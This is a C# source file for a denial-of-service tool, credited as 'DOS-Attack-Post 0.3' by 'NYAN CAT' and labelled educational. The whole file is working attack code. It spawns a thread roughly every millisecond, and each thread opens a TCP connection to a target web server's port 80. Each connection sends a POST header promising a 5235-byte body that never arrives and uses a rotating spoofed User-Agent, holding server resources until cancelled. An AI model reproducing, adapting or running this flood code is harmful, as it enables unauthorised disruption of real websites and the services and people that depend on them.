using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
namespace DDoS_Post
{

    //       │ Author     : NYAN CAT
    //       │ Name       : DOS-Attack-Post 0.3
    //       │ Contact    : https://github.com/NYAN-x-CAT

    //       This program is distributed for educational purposes only.

    public class DosPost
    {
        private readonly string[] userAgents = { " Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"};
        public string Host { get; private set; }
        public CancellationToken CancelToken { get; private set; }
        public List<TcpClient> Clients { get; private set; }


        public DosPost(string host, CancellationToken cancelToken)
        {
            if (string.IsNullOrWhiteSpace(host) || cancelToken == null) return;

            Host = new Uri(host).DnsSafeHost;
            CancelToken = cancelToken;
            Clients = new List<TcpClient>();
        }
        public void RunAttack()
        {
            while (!CancelToken.IsCancellationRequested)
            {
                new Thread(() =>
                {
                    try
                    {
                        TcpClient tcp = new TcpClient(Host, 80);
                        Clients.Add(tcp);
                        string post = $"POST / HTTP/1.1\r\nHost: {Host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                        byte[] buffer = Encoding.UTF8.GetBytes(post);
                        tcp.Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                        Console.WriteLine($"Packet has been sent [{DateTime.Now.ToLongTimeString()}]");
                    }
                    catch { }

                }).Start();
                Thread.Sleep(1);
            }

            Thread.Sleep(2500);
            foreach (TcpClient client in Clients.ToList())
            {
                client?.Client.Dispose();
            }
            Console.WriteLine("Stopped");
            Console.Read();
        }
    }
}